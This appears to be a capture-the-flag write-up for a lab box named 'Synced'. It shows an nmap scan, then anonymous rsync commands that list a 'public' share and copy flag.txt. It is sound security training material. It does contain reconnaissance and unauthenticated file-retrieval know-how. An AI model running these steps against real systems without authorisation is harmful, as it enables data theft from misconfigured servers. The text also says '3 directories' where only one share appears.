# Synced

# TL;DR

- Exposes a directory over `rsync` with anonymous login. We are able to remotely access this directory using the command line tool `rsync` and retrieve the flag.

# Enumeration

- `ping 10.129.228.37` : to test if the server us up and running.
- We scan the host to determine running services:
```
nmap -p- --min-rate=1000 -sV 10.129.228.37
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-01 20:21 PST
Nmap scan report for 10.129.228.37
Host is up (0.085s latency).
Not shown: 65534 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.38 seconds
```
- From the scan we find the following service(s) running:
    - `rsync` on port`873/tcp`

# Foothold

 - Since we do not have a know user on the target host we can start by listing the directories on the target host with the following command (no username specified in the command will result in the utility trying to connect as an anonymous user):
```
rsync --list-only 10.129.228.37::            
public          Anonymous Share
```
- From the output above we can see 3 directories, we can list the files in the first directory:
```
rsync --list-only 10.129.228.37::public
drwxr-xr-x          4,096 2022/10/24 15:02:23 .
-rw-r--r--             33 2022/10/24 14:32:03 flag.txt
```
- We notice the `flag.txt` in the public share. We can copy this file to our local machine and view it there:
```
rsync 10.129.228.37::public/flag.txt destflag.txt
```